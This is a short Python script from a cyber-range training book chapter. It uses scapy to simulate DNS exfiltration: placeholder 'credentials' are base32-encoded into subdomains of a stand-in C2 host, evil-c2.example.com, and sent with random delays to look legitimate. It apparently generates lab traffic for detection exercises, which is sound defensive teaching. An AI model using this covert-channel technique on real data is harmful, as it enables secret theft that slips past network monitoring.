# Extraído de: LibroCyberrange/cap-15-ataques-defensa.md
# Ejemplo didáctico: traffic-profiles/dns-exfiltration.py
from scapy.all import IP, UDP, DNS, DNSQR, send
import base64, time, random

# Datos "exfiltrados" codificados en subdominios DNS
exfil_data = "credenciales-sensibles-del-ejercicio"
chunks = [exfil_data[i:i+30] for i in range(0, len(exfil_data), 30)]

for chunk in chunks:
    encoded = base64.b32encode(chunk.encode()).decode().lower()
    query = f"{encoded}.data.evil-c2.example.com"

    pkt = IP(dst="10.1.0.1") / UDP(dport=53) / \
          DNS(rd=1, qd=DNSQR(qname=query, qtype="A"))

    send(pkt, verbose=False)
    # Retardo variable para parecer tráfico legítimo
    time.sleep(random.uniform(0.5, 3.0))
    print(f"[DNS-EXFIL] Query: {query}")
